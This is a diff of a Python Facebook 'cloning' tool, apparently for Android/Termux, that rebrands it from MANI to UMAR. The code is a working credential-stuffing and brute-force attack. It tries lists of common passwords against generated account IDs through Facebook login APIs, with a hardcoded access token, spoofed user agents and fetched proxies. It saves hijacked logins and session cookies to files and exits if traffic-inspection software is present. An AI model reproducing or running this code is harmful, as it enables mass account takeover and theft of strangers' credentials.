@@ -6,7 +6,7 @@ os.system('clear')
 print('\n [√] Wait Installing Modules...!')
 #os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
 
-def mani():
+def UMAR():
     for i in range(100):
         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
         fbbv = str(random.randint(111111111,999999999))
@@ -36,23 +36,23 @@ try:
 except ModuleNotFoundError:
         print('\n [√] Installing Missing Modules...!')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python MANI.py')
+        os.system('python UMAR.py')
 except:pass
 
 ######### HTTP CANARY #######
 def http():
     try:
           os.system('cd /sdcard','cd Android','cd data')
-          mani = os.listdir('/sdcard/Android/data')
-          if 'com.httpcanary.pro' in mani:                 
+          UMAR = os.listdir('/sdcard/Android/data')
+          if 'com.httpcanary.pro' in UMAR:                 
                  print('m[×] \033[1;31mFirst Uninstall Http Canary Then Run This Tool !');exit()
           else:pass
     except Exception as e:
                     pass
     try:
           os.system('cd /sdcard','cd Android','cd data')
-          mani = os.listdir('/sdcard/Android/data')
-          if 'com.guoshi.httpcanary' in mani:                 
+          UMAR = os.listdir('/sdcard/Android/data')
+          if 'com.guoshi.httpcanary' in UMAR:                 
                  print('m[×] \033[1;31mFirst Uninstall Http Canary Then Run This Tool !');exit()
           else:pass
     except Exception as e:
@@ -65,7 +65,7 @@ proxies = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '
 os.system('touch prox.txt')
 
 try:
-    prox= requests.get('https://raw.githubusercontent.com/MANI-RAJPOOT/Proxy/main/prox.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/UMAR-RAJPOOT/Proxy/main/prox.txt').text
     open('prox.txt','w').write(prox)
 except Exception as e:
     
@@ -201,13 +201,13 @@ def menu():
     print(' [2\033[97;1m] RANDOM CLONING ')
     print(' [3\033[97;1m] JOIN GROUP ')
     print(' [4\033[97;1m] CONTACT ADMIN')
-    print(' [0\033[97;1m] EXIT FROM MANI TOOL ');line()
-    mani=input(' [•] Choose : ')
-    if mani in ['1','01']:file()
-    elif mani in ['2','02']:pak()
-    elif mani in ['3','03']: group()
-    elif mani in ['4','04']:admin()
-    elif mani in ['0','00']:os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287');line();print('[•] Thanks For Use\n[•] See You Again ');exit()
+    print(' [0\033[97;1m] EXIT FROM UMAR TOOL ');line()
+    UMAR=input(' [•] Choose : ')
+    if UMAR in ['1','01']:file()
+    elif UMAR in ['2','02']:pak()
+    elif UMAR in ['3','03']: group()
+    elif UMAR in ['4','04']:admin()
+    elif UMAR in ['0','00']:os.system('xdg-open https://www.facebook.com/profile.php?id=100003054696287');line();print('[•] Thanks For Use\n[•] See You Again ');exit()
     else:
         line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);menu()
 
@@ -218,12 +218,12 @@ def group():
     print(' [\033[1;32m1\033[97;1m] Join WhatsApp Group')
     print(' [\033[1;32m2\033[97;1m] Join Facebook Group')
     print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
-    mani=input(' [•] Choose : ')
-    if mani == '1':
+    UMAR=input(' [•] Choose : ')
+    if UMAR == '1':
         os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb');menu()
-    if mani == '2':
+    if UMAR == '2':
         os.system('xdg-open https://www.facebook.com/InnocentUmarr/');menu()
-    if mani == '0':
+    if UMAR == '0':
         menu()
     else:
         line();print(' [•] Selected Wrong Option ');time.sleep(2);menu()
@@ -235,12 +235,12 @@ def admin():
     print(' [\033[1;32m1\033[97;1m] Contact To Whatsapp')
     print(' [\033[1;32m2\033[97;1m] Contact To Facebook')
     print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
-    mani=input(' [•] \033[1;32mChoose : ')
-    if mani == '1':
+    UMAR=input(' [•] \033[1;32mChoose : ')
+    if UMAR == '1':
         os.system('xdg-open https://wa.me/+923021431324');menu()
-    if mani == '2':
+    if UMAR == '2':
         os.system('xdg-open https://www.facebook.com/InnocentUmarr?mibextid=ZbWKwL');menu()
-    if mani == '0':
+    if UMAR == '0':
         menu()
     else:
         line();print(' [•] Selected Wrong Option ');time.sleep(2);menu()
@@ -264,15 +264,15 @@ def pak():
    
                 #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
                  
-                with tred(max_workers=30) as Mani:     
+                with tred(max_workers=30) as UMAR:     
                         clear()
                         tl = str(len(user))
                         print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");line()
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan123','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','baloch','baloch123','khan1122','khan12','Bangladesh','bangladesh','i love you','iloveyou','janjan','free fire','freefire','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
-                                Mani.submit(rndm,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/MANI/MANI-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/MAN/MANI-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python MANI.py')
+                                UMAR.submit(rndm,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/UMAR/UMAR-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/MAN/UMAR-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python UMAR.py')
 
 
 
@@ -280,7 +280,7 @@ def pak():
 
 def file():
     
-        clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/MANI.txt");line()
+        clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/UMAR.txt");line()
         file = input(f'\033[1;32m [?]\033[1;37m Put File Path : ')
         try:
             fo = open(file,'r').read().splitlines()
@@ -318,13 +318,13 @@ def file():
                     crack_submit.submit(ffb,ids,names,passlist)               
                 else:
                     crack_submit.submit(ffb,ids,names,passlist)
-        print('\n');line();print("\033[1;32m [✓] \033[1;37mYour Process Has Been Completed");line();input("\033[1;32m [✓] \033[1;37mPress Enter To Back Menu ");os.system('python MANI.py')
+        print('\n');line();print("\033[1;32m [✓] \033[1;37mYour Process Has Been Completed");line();input("\033[1;32m [✓] \033[1;37mPress Enter To Back Menu ");os.system('python UMAR.py')
 
 ######### FILE METHOD 1 #######
                 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [MANI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [UMAR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -347,15 +347,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [MANI-OK] '+ids+' √ '+pas+'\033[1;97m')
-                                open('/sdcard/MANI/MANI-OK.txt','a').write(ids+' √ '+pas+'\n')
+                                print('\r\r\033[1;32m [UMAR-OK] '+ids+' √ '+pas+'\033[1;97m')
+                                open('/sdcard/UMAR/UMAR-OK.txt','a').write(ids+' √ '+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in cp:
-                                        print('\r\r\033[1;37m [MANI-CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open('/sdcard/MANI/MANI-CP.txt','a').write(ids+' • '+pas+'\n')
+                                        print('\r\r\033[1;37m [UMAR-CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open('/sdcard/UMAR/UMAR-CP.txt','a').write(ids+' • '+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -371,7 +371,7 @@ def ffb(ids,names,passlist):
 def api1(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MANI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [UMAR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -464,23 +464,23 @@ def api1(ids,names,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         
-                                        print('\r\r\033[1;32m [MANI-OK] '+ids+' √ '+pas+'\033[1;97m')
-                                        open('/sdcard/MANI/MANI-OK.txt','a').write(ids+' √ '+pas+'\n')
+                                        print('\r\r\033[1;32m [UMAR-OK] '+ids+' √ '+pas+'\033[1;97m')
+                                        open('/sdcard/UMAR/UMAR-OK.txt','a').write(ids+' √ '+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;36m[MANI-2F] '+ids+' ~ '+pas)
+                                                print('\r\r \033[1;36m[UMAR-2F] '+ids+' ~ '+pas)
                                                 twf.append(ids)
                                                 break                                                                                                                     
                         elif 'www.facebook.com' in po['error_msg']:                            
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;37m [MANI-CP] '+ids+' • '+pas+'\033[1;97m')
-                                                open('/sdcard/MANI/MANI-CP.txt','a').write(ids+'•'+pas+'\n')
+                                                print('\r\r\033[1;37m [UMAR-CP] '+ids+' • '+pas+'\033[1;97m')
+                                                open('/sdcard/UMAR/UMAR-CP.txt','a').write(ids+'•'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MANI/MANI-CP.txt','a').write(ids+' • '+pas+'\n')
+                                                open('/sdcard/UMAR/UMAR-CP.txt','a').write(ids+' • '+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -497,7 +497,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MANI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [UMAR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:                    
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -558,7 +558,7 @@ def rndm(ids,passlist):
                                 'Authorization':f'OAuth {accessToken}',
                                 'X-FB-Friendly-Name':'authenticate',
                                 'X-FB-Connection-Type':'unknown',
-                                'User-Agent':mani(),
+                                'User-Agent':UMAR(),
                                 'Accept-Encoding':'gzip, deflate',
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'X-FB-HTTP-Engine': 'Liger'
@@ -575,10 +575,10 @@ def rndm(ids,passlist):
                                         break
                                 else:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print('\r\r\033[1;32m [MANI-OK] '+str(uid)+' √ '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [UMAR-OK] '+str(uid)+' √ '+pas+'\033[1;97m')
                                         if "c" in user_opt:print(" \033[1;37m[\033[1;32mCOOKIE\033[1;37m] : \033[1;35m",coki)  
-                                        open('/sdcard/MANI/MANI-COOKIEI-OK.txt','a').write(ids+' √ '+pas+ ' >>> ' +coki+'\n')
-                                        open('/sdcard/MANI/MANI-OK.txt','a').write(str(uid)+' √ '+pas+'\n')
+                                        open('/sdcard/UMAR/UMAR-COOKIEI-OK.txt','a').write(ids+' √ '+pas+ ' >>> ' +coki+'\n')
+                                        open('/sdcard/UMAR/UMAR-OK.txt','a').write(str(uid)+' √ '+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -588,8 +588,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        #print('\r\r\033[1;37m [MANI-CP] '+str(uid)+' • '+pas+'\033[1;97m')
-                                        open('/sdcard/MANI/MANI-CP.txt','a').write(str(uid)+' • '+pas+'\n')
+                                        #print('\r\r\033[1;37m [UMAR-CP] '+str(uid)+' • '+pas+'\033[1;97m')
+                                        open('/sdcard/UMAR/UMAR-CP.txt','a').write(str(uid)+' • '+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
